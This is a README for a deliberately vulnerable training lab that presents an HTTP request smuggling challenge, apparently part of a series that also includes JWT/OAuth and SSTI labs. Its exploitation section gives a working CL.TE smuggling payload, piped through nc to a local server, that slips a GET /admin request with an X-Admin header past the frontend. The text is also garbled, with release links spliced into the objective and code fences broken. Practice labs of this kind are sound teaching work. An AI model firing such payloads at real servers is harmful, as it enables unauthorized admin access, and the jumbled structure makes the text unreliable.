# 🔥 Z-Vuln-Lab — HTTP Request Smuggling Challenge

This lab demonstrates a real-world **HTTP Request Smuggling** vulnerability caused by inconsistent request parsing between frontend and backend servers.

Participants must exploit this parsing mismatch to smuggle a hidden request and access a protected admin endpoint.

---

## 🧠 Vulnerability Overview

- 🔥 **HTTP Request Smuggling**  
  Branch: `http-smuggling-v5`  
  https://github.com/Zwique/Z_Vuln_Lab/tree/http-smuggling-v5

- 🔐 **JWT Auth Bypass (OAuth)**  
  Branch: `jwt-oauth`  
  https://github.com/Zwique/Z_Vuln_Lab/tree/jwt-oauth

- A frontend server parses requests using **Content-Length**, and
- A backend server parses requests using **Transfer-Encoding: chunked**,

allowing attackers to craft a single request that is interpreted as **two separate requests** by different servers.

This lab simulates that behavior in a single backend server to make the vulnerability easy to study and exploit.

---

## 🎯 Objective



- 🔐 **v4.0-jwt-oauth**  
  https://github.com/Zwique/Z_Vuln_Lab/releases/tag/v4.0-jwt-oauth

GET /admin

by smuggling it through a seemingly harmless request to:

- 🧬 **v1.0-ssti**  
  https://github.com/Zwique/Z_Vuln_Lab/releases/tag/v1.0-ssti
---

GET /admin HTTP/1.1
Host: test
X-Admin: true

```
# 💥 Exploitation
```
printf 'POST /submit HTTP/1.1\r\nHost: test\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: test\r\nX-Admin: true\r\n\r\n' | nc 127.0.0.1 8000
```
```
python3 exp.py
```
